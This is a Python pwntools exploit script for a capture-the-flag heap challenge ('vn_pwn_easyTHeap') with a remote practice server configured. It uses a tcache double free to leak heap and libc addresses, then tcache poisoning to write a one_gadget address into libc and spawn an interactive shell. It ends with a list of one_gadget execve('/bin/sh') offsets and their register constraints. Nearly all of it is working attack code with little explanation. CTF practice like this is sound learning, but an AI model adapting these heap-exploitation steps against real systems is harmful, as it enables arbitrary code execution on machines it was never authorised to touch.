#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'vn_pwn_easyTHeap'
libFile = '/lib/x86_64-linux-gnu/libc.so.6'

remoteIp = "node3.buuoj.cn"
remotePort = 28200


LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------

def ad(size):
	sla('choice: ', str(1))
	sla('?', str(size))

def rm(idx):
	sla('choice: ', str(4))
	sla('?', str(idx))

def md(idx, data):
	sla('choice: ', str(2))
	sla('?', str(idx))
	sa(':', data)

def dp(idx):
	sla('choice: ', str(3))
	sla('?', str(idx))

def q():
	sla('choice: ', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x100) #idx 0
	ad(0x100) #idx 1

	rm(0)
	rm(0)

	# leak heap addr
	dp(0)
	heap_base = u64(ru('\n') + '\x00\x00') - 0x260
	li('heap_base ' + hex(heap_base))

	ad(0x100) # 2 for ajust
	ad(0x100) # 3
	ad(0x100) # 4 teache count as -1, so free chunk will not be teache bin
	rm(0)

	# leak libc

	dp(0)
	lib.address = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 96 - 0x3ebc40
	li('libc base ' + hex(lib.address))
	ABS = lib.address + (0x7fd855098048 - 0x7fd854cad000)
	gadget = [0x4f2c5, 0x4f322, 0xe569f, 0xe5858, 0xe585f, 0xef863, 0x10a38c, 0x10a398]
	one_gadget = lib.address + gadget[1]

	# can't malloc only to modify _IO_2_1_stdout vtable

	md(3, p64(ABS))

	ad(0x100) # idx 5 for ajust
	li('ABS_got ' + hex(ABS))
	ad(0x100) # idx 6, malloc to our addr

	p = p64(one_gadget)
	#db()
	md(6, p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0xe569f execve("/bin/sh", r14, r12)
constraints:
  [r14] == NULL || r14 == NULL
  [r12] == NULL || r12 == NULL

0xe5858 execve("/bin/sh", [rbp-0x88], [rbp-0x70])
constraints:
  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe585f execve("/bin/sh", r10, [rbp-0x70])
constraints:
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe5863 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

0x10a398 execve("/bin/sh", rsi, [rax])
constraints:
  [rsi] == NULL || rsi == NULL
  [[rax]] == NULL || [rax] == NULL
'''
